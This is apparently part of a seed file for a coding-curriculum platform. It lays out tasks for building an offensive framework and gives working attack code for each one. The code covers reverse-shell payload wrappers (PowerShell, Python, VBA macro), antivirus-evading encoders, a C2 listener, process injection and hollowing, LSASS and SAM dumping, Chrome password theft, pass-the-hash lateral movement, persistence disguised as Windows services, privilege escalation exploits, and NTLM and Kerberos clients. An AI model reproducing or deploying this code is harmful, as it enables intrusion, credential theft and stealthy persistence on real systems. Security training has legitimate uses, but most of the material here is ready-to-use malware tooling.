class Payload:
    def __init__(self, config):
        self.config = config  # C2 host, port, sleep, etc.

    def generate(self, format='raw'):
        shellcode = self.generate_shellcode()

        if format == 'raw':
            return shellcode
        elif format == 'exe':
            return self.wrap_exe(shellcode)
        elif format == 'dll':
            return self.wrap_dll(shellcode)
        elif format == 'powershell':
            return self.wrap_powershell(shellcode)
        elif format == 'python':
            return self.wrap_python(shellcode)

    def generate_shellcode(self):
        # Platform-specific shellcode
        raise NotImplementedError
\`\`\`

### Windows Reverse Shell
\`\`\`python
class WindowsReverseShell(Payload):
    def generate_shellcode(self):
        # Embed C2 address in shellcode
        host = socket.inet_aton(self.config['host'])
        port = struct.pack('>H', self.config['port'])

        shellcode = (
            b"\\xfc\\xe8\\x82\\x00\\x00\\x00"  # Start
            # ... WinSock initialization ...
            + host + port +
            # ... connect and spawn cmd.exe ...
        )
        return shellcode
\`\`\`

### Format Wrappers
\`\`\`python
def wrap_exe(self, shellcode):
    # Minimal PE that executes shellcode
    pe_header = self.build_pe_header(len(shellcode))
    return pe_header + shellcode

def wrap_powershell(self, shellcode):
    b64 = base64.b64encode(shellcode).decode()
    return f'''
$code = [System.Convert]::FromBase64String("{b64}")
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($code.Length)
[System.Runtime.InteropServices.Marshal]::Copy($code, 0, $mem, $code.Length)
$thread = [Win32]::CreateThread(0, 0, $mem, 0, 0, 0)
[Win32]::WaitForSingleObject($thread, [uint32]"0xFFFFFFFF")
'''

def wrap_python(self, shellcode):
    b64 = base64.b64encode(shellcode).decode()
    return f'''
import ctypes, base64
code = base64.b64decode("{b64}")
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(code), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, code, len(code))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
'''

def wrap_vba(self, shellcode):
    # Convert to VBA byte array for macro
    hex_array = ','.join(str(b) for b in shellcode)
    return f'''
Sub AutoOpen()
    Dim code() As Byte
    code = Array({hex_array})
    ' ... VirtualAlloc and execute ...
End Sub
'''
\`\`\`

## Completion Criteria
- [ ] Generate raw shellcode
- [ ] Wrap in multiple formats
- [ ] Embed C2 configuration
- [ ] Cross-platform support`],

				['Build encoder system', 'Encode payloads to evade detection: XOR, shikata_ga_nai (polymorphic), base64. Chain encoders. Avoid bad characters (null bytes). Prepend decoder stub.',
`## Payload Encoding

### XOR Encoder
\`\`\`python
class XOREncoder:
    def encode(self, shellcode, key=None, bad_chars=b'\\x00'):
        if key is None:
            key = self.find_key(shellcode, bad_chars)

        encoded = bytes([b ^ key for b in shellcode])

        # Decoder stub (x86)
        decoder = (
            b"\\xeb\\x0b"                    # jmp short get_address
            b"\\x5e"                          # pop esi (shellcode addr)
            b"\\x31\\xc9"                     # xor ecx, ecx
            b"\\xb1" + bytes([len(shellcode)]) +  # mov cl, length
            b"\\x80\\x36" + bytes([key]) +    # xor byte [esi], key
            b"\\x46"                          # inc esi
            b"\\xe2\\xfa"                     # loop decode
            b"\\xeb\\x05"                     # jmp shellcode
            b"\\xe8\\xf0\\xff\\xff\\xff"       # call get_address
        )
        return decoder + encoded

    def find_key(self, shellcode, bad_chars):
        for key in range(1, 256):
            encoded = bytes([b ^ key for b in shellcode])
            if not any(c in encoded for c in bad_chars):
                return key
        raise ValueError("No valid key found")
\`\`\`

### Polymorphic Encoder
\`\`\`python
class ShikataGaNai:
    """Polymorphic XOR encoder with random key and decoder variations"""

    def encode(self, shellcode, iterations=1):
        for _ in range(iterations):
            key = os.urandom(4)

            # Randomize decoder instructions
            decoder = self.generate_random_decoder(key, len(shellcode))

            # Encode shellcode
            encoded = self.xor_encode(shellcode, key)

            shellcode = decoder + encoded

        return shellcode

    def generate_random_decoder(self, key, length):
        # Multiple equivalent instruction sequences
        # Randomize register usage, instruction order, add garbage
        variants = [
            self.decoder_variant_1(key, length),
            self.decoder_variant_2(key, length),
            self.decoder_variant_3(key, length),
        ]
        return random.choice(variants)
\`\`\`

### Encoder Chain
\`\`\`python
class EncoderChain:
    def __init__(self, encoders):
        self.encoders = encoders

    def encode(self, shellcode, bad_chars=b'\\x00'):
        for encoder in self.encoders:
            shellcode = encoder.encode(shellcode, bad_chars=bad_chars)

            # Verify no bad chars
            if any(c in shellcode for c in bad_chars):
                raise ValueError(f"Bad chars present after {encoder.__class__.__name__}")

        return shellcode

# Usage
chain = EncoderChain([
    XOREncoder(),
    Base64Encoder(),
    ShikataGaNai(iterations=3),
])
encoded = chain.encode(shellcode, bad_chars=b'\\x00\\x0a\\x0d')
\`\`\`

## Completion Criteria
- [ ] Implement XOR encoder
- [ ] Build polymorphic encoder
- [ ] Chain multiple encoders
- [ ] Handle bad characters`],

				['Implement session handler', 'Manage active connections: track sessions by ID, route commands to correct session, handle disconnects gracefully, support multiple session types (shell, meterpreter).',
`## Session Management

### Session Base
\`\`\`python
from abc import ABC, abstractmethod
import threading
import uuid

class Session(ABC):
    def __init__(self, connection):
        self.id = str(uuid.uuid4())[:8]
        self.connection = connection
        self.info = {}
        self.active = True

    @abstractmethod
    def execute(self, command) -> str:
        pass

    @abstractmethod
    def upload(self, local_path, remote_path):
        pass

    @abstractmethod
    def download(self, remote_path, local_path):
        pass

    def close(self):
        self.active = False
        self.connection.close()
\`\`\`

### Session Handler
\`\`\`python
class SessionHandler:
    def __init__(self):
        self.sessions = {}
        self.listeners = []
        self.lock = threading.Lock()

    def add_session(self, session):
        with self.lock:
            self.sessions[session.id] = session
            print(f"[+] New session: {session.id}")
            return session.id

    def get_session(self, session_id):
        return self.sessions.get(session_id)

    def list_sessions(self):
        return [
            {
                'id': s.id,
                'type': s.__class__.__name__,
                'info': s.info,
                'active': s.active
            }
            for s in self.sessions.values()
        ]

    def remove_session(self, session_id):
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id].close()
                del self.sessions[session_id]
\`\`\`

### Shell Session
\`\`\`python
class ShellSession(Session):
    def execute(self, command):
        self.connection.send(command.encode() + b'\\n')

        # Read output until prompt
        output = b''
        while True:
            chunk = self.connection.recv(4096)
            if not chunk:
                break
            output += chunk
            if self.is_prompt(output):
                break

        return output.decode(errors='ignore')

    def interactive(self):
        import select
        import sys

        print(f"[*] Interactive shell (Ctrl+C to background)")
        while self.active:
            r, _, _ = select.select([sys.stdin, self.connection], [], [], 0.1)

            if sys.stdin in r:
                cmd = sys.stdin.readline()
                self.connection.send(cmd.encode())

            if self.connection in r:
                data = self.connection.recv(4096)
                if not data:
                    break
                print(data.decode(errors='ignore'), end='')
\`\`\`

### Listener
\`\`\`python
class Listener:
    def __init__(self, handler, host, port, session_class=ShellSession):
        self.handler = handler
        self.host = host
        self.port = port
        self.session_class = session_class
        self.running = False

    def start(self):
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(5)
        self.running = True

        print(f"[*] Listening on {self.host}:{self.port}")

        threading.Thread(target=self._accept_loop, daemon=True).start()

    def _accept_loop(self):
        while self.running:
            conn, addr = self.sock.accept()
            print(f"[*] Connection from {addr}")
            session = self.session_class(conn)
            self.handler.add_session(session)
\`\`\`

## Completion Criteria
- [ ] Session base class
- [ ] Session handler with tracking
- [ ] Shell session type
- [ ] Listener for callbacks`],
			]);
			modId = getOrCreateModule(p.id, 'Post-Exploitation', 'After initial access', 21);
			addTasksToModule(modId, [
				['Build process injection', 'Multiple techniques: CreateRemoteThread classic, QueueUserAPC for early-bird, process hollowing, module stomping. Target selection: find suitable host process.',
`## Process Injection Techniques

### CreateRemoteThread (Classic)
\`\`\`c
// 1. Get handle to target process
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

// 2. Allocate memory in target
LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize,
    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 3. Write shellcode
WriteProcessMemory(hProcess, remoteBuffer, shellcode, shellcodeSize, NULL);

// 4. Create remote thread
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
    (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
\`\`\`

### Process Hollowing
\`\`\`c
// 1. Create suspended process
STARTUPINFO si = {0};
PROCESS_INFORMATION pi = {0};
CreateProcess("C:\\\\Windows\\\\System32\\\\svchost.exe", NULL,
    NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Unmap original executable
NtUnmapViewOfSection(pi.hProcess, imageBase);

// 3. Allocate new memory and write payload
VirtualAllocEx(pi.hProcess, imageBase, payloadSize, ...);
WriteProcessMemory(pi.hProcess, imageBase, payload, payloadSize, NULL);

// 4. Update entry point in thread context
CONTEXT ctx;
GetThreadContext(pi.hThread, &ctx);
ctx.Rcx = (DWORD64)newEntryPoint;  // x64
SetThreadContext(pi.hThread, &ctx);

// 5. Resume thread
ResumeThread(pi.hThread);
\`\`\`

### Target Selection
\`\`\`python
def find_injection_target():
    good_targets = ['explorer.exe', 'RuntimeBroker.exe', 'sihost.exe']
    avoid = ['csrss.exe', 'smss.exe', 'lsass.exe']  # Protected

    for proc in psutil.process_iter():
        if proc.name() in good_targets:
            if proc.username() == current_user():  # Same user context
                return proc.pid
    return None
\`\`\`

## Completion Criteria
- [ ] Implement CreateRemoteThread
- [ ] Implement process hollowing
- [ ] Add target selection logic
- [ ] Test detection evasion`],

				['Implement credential harvesting', 'Extract from memory: LSASS dump (MiniDumpWriteDump), SAM database, browser passwords, cached credentials. Parse for NTLM hashes, Kerberos tickets, plaintext.',
`## Credential Harvesting

### LSASS Memory Dump
\`\`\`c
// Open LSASS process
DWORD lsassPid = GetLsassPid();
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);

// Create dump file
HANDLE hFile = CreateFile("lsass.dmp", GENERIC_WRITE, 0, NULL,
    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

// Dump memory
MiniDumpWriteDump(hProcess, lsassPid, hFile,
    MiniDumpWithFullMemory, NULL, NULL, NULL);
\`\`\`

### Parse LSASS Dump (mimikatz logic)
\`\`\`python
# Conceptual - actual parsing is complex
def parse_lsass_dump(dump_path):
    credentials = []

    # Find LSASRV.dll in memory
    # Locate credential structures (KIWI_MSV1_0_CREDENTIALS, etc.)
    # Decrypt using LSA keys

    # Look for:
    # - NTLM hashes
    # - Kerberos tickets (TGT, TGS)
    # - Plaintext passwords (wdigest if enabled)
    # - Cached domain credentials

    return credentials
\`\`\`

### SAM Database Extraction
\`\`\`python
# Requires SYSTEM privileges
def extract_sam():
    # Save registry hives
    os.system('reg save HKLM\\\\SAM sam.save')
    os.system('reg save HKLM\\\\SYSTEM system.save')

    # Or copy directly (need VSS for locked files)
    # C:\\Windows\\System32\\config\\SAM
    # C:\\Windows\\System32\\config\\SYSTEM

    # Parse with impacket
    from impacket.examples.secretsdump import LocalOperations
    local = LocalOperations('system.save')
    bootKey = local.getBootKey()
    sam = SAMHashes('sam.save', bootKey)
    sam.dump()
\`\`\`

### Browser Credentials
\`\`\`python
def chrome_passwords():
    # Chrome stores passwords in SQLite encrypted with DPAPI
    db_path = os.path.expandvars(
        r'%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data'
    )

    # Copy to avoid lock
    shutil.copy2(db_path, 'login_data_copy')

    conn = sqlite3.connect('login_data_copy')
    cursor = conn.execute(
        'SELECT origin_url, username_value, password_value FROM logins'
    )

    for url, user, encrypted_pass in cursor:
        # Decrypt with DPAPI
        decrypted = CryptUnprotectData(encrypted_pass)
        print(f"{url} - {user}:{decrypted}")
\`\`\`

## Completion Criteria
- [ ] Dump LSASS memory
- [ ] Extract SAM hashes
- [ ] Harvest browser credentials
- [ ] Parse Kerberos tickets`],

				['Add lateral movement', 'Move through network: WMI execution, SMB PsExec, WinRM, DCOM. Pass credentials or use current token. Target selection based on recon data.',
`## Lateral Movement

### WMI Execution
\`\`\`python
import wmi

def wmi_exec(target, username, password, command):
    connection = wmi.WMI(
        computer=target,
        user=username,
        password=password
    )

    process_startup = connection.Win32_ProcessStartup.new()
    process_id, result = connection.Win32_Process.Create(
        CommandLine=command,
        ProcessStartupInformation=process_startup
    )

    return result == 0
\`\`\`

### SMB PsExec
\`\`\`python
from impacket.smbconnection import SMBConnection
from impacket.examples.psexec import PSEXEC

def smb_exec(target, username, password, command):
    # Connect to SMB
    smb = SMBConnection(target, target)
    smb.login(username, password)

    # Copy service binary
    smb.putFile('ADMIN$', 'service.exe', open('payload.exe', 'rb').read)

    # Create and start service
    executer = PSEXEC(command, username=username, password=password)
    executer.run(target)
\`\`\`

### WinRM
\`\`\`python
import winrm

def winrm_exec(target, username, password, command):
    session = winrm.Session(
        target,
        auth=(username, password),
        transport='ntlm'
    )

    result = session.run_cmd(command)
    return result.std_out.decode()

# PowerShell
def winrm_ps(target, username, password, script):
    session = winrm.Session(target, auth=(username, password))
    result = session.run_ps(script)
    return result.std_out.decode()
\`\`\`

### Pass-the-Hash
\`\`\`bash
# Using impacket with NTLM hash (no password needed)
wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:hash domain/user@target

psexec.py -hashes :hash domain/user@target

# Overpass-the-hash (get Kerberos ticket from hash)
getTGT.py -hashes :hash domain/user
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass domain/user@target
\`\`\`

## Completion Criteria
- [ ] Implement WMI execution
- [ ] Build SMB/PsExec method
- [ ] Add WinRM support
- [ ] Pass-the-hash capability`],

				['Build persistence mechanisms', 'Survive reboots: Registry run keys, scheduled tasks, services, WMI subscriptions. Choose based on privileges (user vs admin). Avoid common detection signatures.',
`## Persistence Mechanisms

### Registry Run Keys
\`\`\`python
import winreg

def registry_persistence(payload_path, name="WindowsUpdate"):
    # User-level (no admin needed)
    key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, payload_path)
    winreg.CloseKey(key)

    # Admin-level (all users)
    # HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
\`\`\`

### Scheduled Task
\`\`\`python
import subprocess

def scheduled_task_persistence(payload_path, task_name="SystemHealthCheck"):
    # User-level task
    cmd = f'''schtasks /create /tn "{task_name}" /tr "{payload_path}" '''
    cmd += f'''/sc onlogon /ru "%USERNAME%" /f'''
    subprocess.run(cmd, shell=True)

    # Admin-level with SYSTEM
    cmd = f'''schtasks /create /tn "{task_name}" /tr "{payload_path}" '''
    cmd += f'''/sc onstart /ru SYSTEM /f'''
\`\`\`

### Windows Service
\`\`\`python
def service_persistence(payload_path, service_name="WindowsHealthService"):
    # Requires admin
    cmd = f'''sc create {service_name} binPath= "{payload_path}" '''
    cmd += f'''start= auto'''
    subprocess.run(cmd, shell=True)

    subprocess.run(f'sc start {service_name}', shell=True)
\`\`\`

### WMI Event Subscription
\`\`\`python
def wmi_persistence(payload_path):
    # Permanent WMI event subscription
    # Triggers on event (logon, time, etc.)

    filter_name = "SystemEventFilter"
    consumer_name = "SystemEventConsumer"

    # Create event filter (trigger on logon)
    wmi_filter = f'''
    $Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
        Name = "{filter_name}"
        EventNamespace = "root\\cimv2"
        QueryLanguage = "WQL"
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'"
    }}'''

    # Create consumer (action)
    wmi_consumer = f'''
    $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
        Name = "{consumer_name}"
        CommandLineTemplate = "{payload_path}"
    }}'''

    # Bind them
    wmi_binding = f'''
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
        Filter = $Filter
        Consumer = $Consumer
    }}'''
\`\`\`

## Completion Criteria
- [ ] Registry persistence
- [ ] Scheduled task persistence
- [ ] Service persistence
- [ ] WMI subscription`],

				['Implement privilege escalation', 'Elevate permissions: check for misconfigured services, unquoted paths, AlwaysInstallElevated, token impersonation (Potato attacks). Automated privesc checking.',
`## Privilege Escalation

### Automated Checks
\`\`\`python
def check_privesc_vectors():
    vectors = []

    # Unquoted service paths
    for service in get_services():
        if ' ' in service.path and not service.path.startswith('"'):
            vectors.append(('unquoted_path', service))

    # Weak service permissions
    for service in get_services():
        if can_modify_service(service):
            vectors.append(('weak_service_perms', service))

    # AlwaysInstallElevated
    if check_always_install_elevated():
        vectors.append(('always_install_elevated', None))

    # Token privileges
    if has_impersonate_privilege():
        vectors.append(('impersonate_privilege', None))

    return vectors
\`\`\`

### Unquoted Service Path
\`\`\`python
def exploit_unquoted_path(service):
    # Path: C:\\Program Files\\My App\\service.exe
    # Windows tries: C:\\Program.exe, C:\\Program Files\\My.exe
    # If we can write to C:\\Program Files\\, we win

    path = service.path
    parts = path.split('\\\\')

    for i in range(1, len(parts)):
        test_path = '\\\\'.join(parts[:i]) + '.exe'
        if is_writable(os.path.dirname(test_path)):
            shutil.copy('payload.exe', test_path)
            return True
    return False
\`\`\`

### Token Impersonation (Potato)
\`\`\`
SeImpersonatePrivilege allows impersonating tokens.
Available to: service accounts, IIS app pools

Potato attacks:
1. Trigger SYSTEM to authenticate to attacker-controlled service
2. Capture and impersonate the SYSTEM token
3. Run commands as SYSTEM

Variants:
- JuicyPotato (older Windows)
- PrintSpoofer (newer Windows)
- GodPotato (latest)
\`\`\`

### AlwaysInstallElevated
\`\`\`python
def check_always_install_elevated():
    # Check both HKLM and HKCU
    try:
        hklm = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"Software\\Policies\\Microsoft\\Windows\\Installer"
        )
        hkcu = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\\Policies\\Microsoft\\Windows\\Installer"
        )

        lm_value = winreg.QueryValueEx(hklm, "AlwaysInstallElevated")[0]
        cu_value = winreg.QueryValueEx(hkcu, "AlwaysInstallElevated")[0]

        return lm_value == 1 and cu_value == 1
    except:
        return False

def exploit_always_install_elevated(payload_path):
    # Create MSI that runs payload as SYSTEM
    os.system(f'msiexec /quiet /i {payload_path}')
\`\`\`

## Completion Criteria
- [ ] Enumerate privesc vectors
- [ ] Exploit unquoted paths
- [ ] Implement token impersonation
- [ ] AlwaysInstallElevated exploit`],
			]);
		} else if (p.name.includes('Impacket') || p.name.includes('SMB') || p.name.includes('Kerberos')) {
			let modId = getOrCreateModule(p.id, 'Protocol Implementation', 'Core protocols', 20);
			addTasksToModule(modId, [
				['Implement SMB client', 'Build SMB2/3 client: negotiate dialect, session setup with NTLM/Kerberos, tree connect to shares. File operations: list, read, write, delete. Handle signing and encryption.',
`## SMB Protocol Implementation

### SMB2 Negotiate
\`\`\`python
class SMBClient:
    def __init__(self, target):
        self.target = target
        self.sock = socket.socket()
        self.sock.connect((target, 445))
        self.session_id = 0
        self.tree_id = 0

    def negotiate(self):
        # Build SMB2 NEGOTIATE request
        header = SMB2Header(
            Command=SMB2_NEGOTIATE,
            MessageId=0,
            SessionId=0,
            TreeId=0
        )

        negotiate = SMB2Negotiate(
            Dialects=[SMB2_DIALECT_302, SMB2_DIALECT_311],
            Capabilities=SMB2_CAP_DFS | SMB2_CAP_LEASING,
            ClientGuid=uuid.uuid4().bytes
        )

        self.send(header, negotiate)
        response = self.recv()

        self.dialect = response.DialectRevision
        self.server_guid = response.ServerGuid
        return response
\`\`\`

### Session Setup
\`\`\`python
def session_setup(self, auth_blob):
    header = SMB2Header(
        Command=SMB2_SESSION_SETUP,
        MessageId=self.message_id,
        SessionId=0
    )

    setup = SMB2SessionSetup(
        SecurityMode=SMB2_NEGOTIATE_SIGNING_ENABLED,
        Capabilities=0,
        SecurityBuffer=auth_blob  # NTLM or Kerberos
    )

    self.send(header, setup)
    response = self.recv()

    if response.Status == STATUS_MORE_PROCESSING_REQUIRED:
        # NTLM Type2 challenge, need to send Type3
        return response.SecurityBuffer
    elif response.Status == 0:
        self.session_id = response.SessionId
        return None
\`\`\`

### Tree Connect & File Operations
\`\`\`python
def tree_connect(self, share):
    # Connect to \\\\server\\share
    header = SMB2Header(Command=SMB2_TREE_CONNECT, SessionId=self.session_id)
    tree = SMB2TreeConnect(Path=f"\\\\\\\\{self.target}\\\\{share}")

    self.send(header, tree)
    response = self.recv()
    self.tree_id = response.TreeId
    return response

def list_directory(self, path):
    # Open directory
    file_id = self.create(path, FILE_DIRECTORY_FILE)

    # Query directory
    header = SMB2Header(Command=SMB2_QUERY_DIRECTORY, ...)
    query = SMB2QueryDirectory(FileId=file_id, FileName="*")

    self.send(header, query)
    return self.parse_directory_response(self.recv())

def read_file(self, path):
    file_id = self.create(path, FILE_READ_DATA)
    # SMB2 READ
    ...
\`\`\`

## Completion Criteria
- [ ] Negotiate SMB2/3 dialect
- [ ] Session setup with auth
- [ ] Tree connect to shares
- [ ] File operations (list, read, write)`],

				['Build DCE/RPC', 'Implement DCE/RPC over SMB named pipes. Bind to interfaces (SAMR, LSARPC, SVCCTL) by UUID. Marshal/unmarshal NDR data. Call remote procedures.',
`## DCE/RPC Implementation

### Named Pipe Transport
\`\`\`python
class DCERPCTransport:
    def __init__(self, smb_client, pipe_name):
        self.smb = smb_client
        self.pipe_name = pipe_name
        self.file_id = None

    def connect(self):
        # Connect to IPC$ share
        self.smb.tree_connect("IPC$")

        # Open named pipe
        self.file_id = self.smb.create(
            self.pipe_name,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE
        )

    def send(self, data):
        self.smb.write(self.file_id, data)

    def recv(self):
        return self.smb.read(self.file_id)
\`\`\`

### RPC Bind
\`\`\`python
# Well-known interface UUIDs
SAMR_UUID = "12345778-1234-abcd-ef00-0123456789ac"
LSARPC_UUID = "12345778-1234-abcd-ef00-0123456789ab"
SVCCTL_UUID = "367abb81-9844-35f1-ad32-98f038001003"

class DCERPCClient:
    def bind(self, interface_uuid, interface_version):
        # Build bind PDU
        bind = DCERPCBind(
            MaxXmitFrag=4280,
            MaxRecvFrag=4280,
            ContextList=[
                ContextItem(
                    AbstractSyntax=interface_uuid,
                    TransferSyntax=NDR_UUID
                )
            ]
        )

        self.transport.send(bind.pack())
        response = DCERPCBindAck.unpack(self.transport.recv())

        if response.ResultList[0].Result != 0:
            raise Exception("Bind rejected")
\`\`\`

### RPC Request
\`\`\`python
def call(self, opnum, data):
    request = DCERPCRequest(
        OpNum=opnum,
        StubData=data  # NDR-encoded parameters
    )

    self.transport.send(request.pack())
    response = DCERPCResponse.unpack(self.transport.recv())

    return response.StubData

# Example: SAMR operations
def samr_connect(self, server_name):
    # NDR encode parameters
    ndr_data = NDR()
    ndr_data.add_pointer(server_name)  # ServerName
    ndr_data.add_uint32(MAXIMUM_ALLOWED)  # DesiredAccess

    result = self.call(SAMR_CONNECT_OPNUM, ndr_data.pack())
    return NDR.unpack_handle(result)
\`\`\`

### NDR Marshaling
\`\`\`python
class NDR:
    def __init__(self):
        self.data = b''

    def add_uint32(self, value):
        self.data += struct.pack('<I', value)

    def add_pointer(self, value):
        if value is None:
            self.data += struct.pack('<I', 0)  # NULL pointer
        else:
            self.data += struct.pack('<I', 0x00020000)  # Ref pointer
            self.add_conformant_string(value)

    def add_conformant_string(self, s):
        encoded = s.encode('utf-16-le') + b'\\x00\\x00'
        max_count = len(s) + 1
        actual_count = len(s) + 1
        self.data += struct.pack('<III', max_count, 0, actual_count)
        self.data += encoded
\`\`\`

## Completion Criteria
- [ ] Named pipe transport
- [ ] RPC bind to interface
- [ ] Make RPC requests
- [ ] NDR marshaling`],

				['Add NTLM authentication', 'Implement NTLM challenge-response: Type1 (negotiate), Type2 (challenge from server), Type3 (response with hash). Support NTLMv1, NTLMv2, pass-the-hash.',
`## NTLM Authentication

### Message Types
\`\`\`python
class NTLMType1:
    """NEGOTIATE message - client sends first"""
    def __init__(self, domain='', workstation=''):
        self.signature = b'NTLMSSP\\x00'
        self.type = 1
        self.flags = (
            NTLMSSP_NEGOTIATE_UNICODE |
            NTLMSSP_NEGOTIATE_NTLM |
            NTLMSSP_NEGOTIATE_SEAL |
            NTLMSSP_REQUEST_TARGET
        )
        self.domain = domain
        self.workstation = workstation

    def pack(self):
        # Pack message structure
        ...

class NTLMType2:
    """CHALLENGE message - server response"""
    def unpack(self, data):
        self.challenge = data[24:32]  # 8-byte nonce
        self.target_info = self.parse_target_info(data)
        return self

class NTLMType3:
    """AUTHENTICATE message - client response"""
    def __init__(self, type2, username, password=None, nt_hash=None):
        self.challenge = type2.challenge
        self.username = username

        if password:
            self.nt_hash = self.compute_nt_hash(password)
        else:
            self.nt_hash = nt_hash  # Pass-the-hash
\`\`\`

### NTLMv2 Response
\`\`\`python
def compute_ntlmv2_response(self, server_challenge, target_info):
    # NTLMv2 hash = HMAC-MD5(NT hash, uppercase(username) + domain)
    nt_hash = self.nt_hash
    user_domain = (self.username.upper() + self.domain).encode('utf-16-le')
    ntlmv2_hash = hmac.new(nt_hash, user_domain, hashlib.md5).digest()

    # Client challenge
    client_challenge = os.urandom(8)

    # Blob structure
    blob = (
        struct.pack('<BBH', 1, 1, 0) +  # Version
        struct.pack('<I', 0) +  # Reserved
        struct.pack('<Q', self.filetime()) +  # Timestamp
        client_challenge +
        struct.pack('<I', 0) +  # Reserved
        target_info +
        struct.pack('<I', 0)  # Padding
    )

    # NTLMv2 response = HMAC-MD5(NTLMv2 hash, server_challenge + blob)
    nt_proof = hmac.new(ntlmv2_hash, server_challenge + blob, hashlib.md5).digest()

    return nt_proof + blob
\`\`\`

### Pass-the-Hash
\`\`\`python
def authenticate_pth(self, username, nt_hash, domain=''):
    """Authenticate using NT hash instead of password"""
    # Type 1
    type1 = NTLMType1(domain=domain)
    response = self.send_type1(type1)

    # Type 2
    type2 = NTLMType2().unpack(response)

    # Type 3 with hash (no password needed)
    type3 = NTLMType3(type2, username, nt_hash=bytes.fromhex(nt_hash))
    return self.send_type3(type3)
\`\`\`

## Completion Criteria
- [ ] Type1 negotiate message
- [ ] Parse Type2 challenge
- [ ] Compute NTLMv2 response
- [ ] Pass-the-hash support`],

				['Implement Kerberos client', 'AS-REQ for TGT (with password/hash/cert), TGS-REQ for service tickets. Handle encryption types (RC4, AES128, AES256). Parse tickets, extract PAC.',
`## Kerberos Implementation

### AS-REQ (Get TGT)
\`\`\`python
class KerberosClient:
    def __init__(self, domain, kdc):
        self.domain = domain.upper()
        self.kdc = kdc

    def get_tgt(self, username, password=None, nt_hash=None):
        # Build AS-REQ
        client_name = PrincipalName(NT_PRINCIPAL, [username])
        server_name = PrincipalName(NT_SRV_INST, ['krbtgt', self.domain])

        req_body = KDCReqBody(
            kdc_options=KDCOptions(['forwardable', 'renewable']),
            cname=client_name,
            realm=self.domain,
            sname=server_name,
            till=self.max_time(),
            nonce=random.getrandbits(32),
            etype=[ETYPE_AES256, ETYPE_AES128, ETYPE_RC4]
        )

        as_req = AS_REQ(req_body=req_body)

        # Send to KDC port 88
        response = self.send_recv(as_req)

        if isinstance(response, KRB_ERROR):
            if response.error_code == KDC_ERR_PREAUTH_REQUIRED:
                # Need pre-authentication
                return self.do_preauth(username, password, nt_hash, response)
            raise KerberosError(response)

        return self.decrypt_as_rep(response, password, nt_hash)
\`\`\`

### Pre-Authentication
\`\`\`python
def do_preauth(self, username, password, nt_hash, error):
    # Get supported encryption types from error
    pa_data = self.parse_pa_data(error.e_data)

    # Compute key from password or hash
    if password:
        key = string_to_key(ETYPE_AES256, password, self.domain + username)
    else:
        key = Key(ETYPE_RC4, nt_hash)

    # Encrypt timestamp
    timestamp = PA_ENC_TS_ENC(patimestamp=datetime.utcnow())
    encrypted_ts = encrypt(key, KU_PA_ENC_TIMESTAMP, timestamp.dump())

    pa_enc_timestamp = PA_DATA(
        padata_type=PA_ENC_TIMESTAMP,
        padata_value=EncryptedData(key.etype, encrypted_ts).dump()
    )

    # Resend AS-REQ with pre-auth
    as_req = AS_REQ(
        padata=[pa_enc_timestamp],
        req_body=self.req_body
    )
    return self.send_recv(as_req)
\`\`\`

### TGS-REQ (Get Service Ticket)
\`\`\`python
def get_service_ticket(self, tgt, session_key, service_name):
    # Build TGS-REQ
    server_name = PrincipalName(NT_SRV_INST, service_name.split('/'))

    authenticator = Authenticator(
        crealm=self.domain,
        cname=tgt.cname,
        ctime=datetime.utcnow(),
        cusec=0
    )
    encrypted_auth = encrypt(session_key, KU_TGS_REQ_AUTH, authenticator.dump())

    ap_req = AP_REQ(
        ticket=tgt.ticket,
        authenticator=EncryptedData(session_key.etype, encrypted_auth)
    )

    tgs_req = TGS_REQ(
        padata=[PA_DATA(PA_TGS_REQ, ap_req.dump())],
        req_body=KDCReqBody(
            sname=server_name,
            realm=self.domain,
            etype=[session_key.etype]
        )
    )

    return self.send_recv(tgs_req)
\`\`\`

## Completion Criteria
- [ ] AS-REQ with pre-auth
- [ ] TGS-REQ for services
- [ ] Support AES and RC4
- [ ] Parse and use tickets`],

				['Build LDAP queries', 'LDAP client: bind (simple/SASL), search with filters (objectClass=user), paged results for large datasets. Query users, groups, computers, GPOs.',
`## LDAP Client

### Connection and Bind
\`\`\`python
import ldap3

class LDAPClient:
    def __init__(self, server, use_ssl=False):
        self.server = ldap3.Server(server, use_ssl=use_ssl, get_info=ldap3.ALL)
        self.conn = None

    def bind_simple(self, username, password):
        self.conn = ldap3.Connection(
            self.server,
            user=username,
            password=password,
            authentication=ldap3.SIMPLE
        )
        return self.conn.bind()

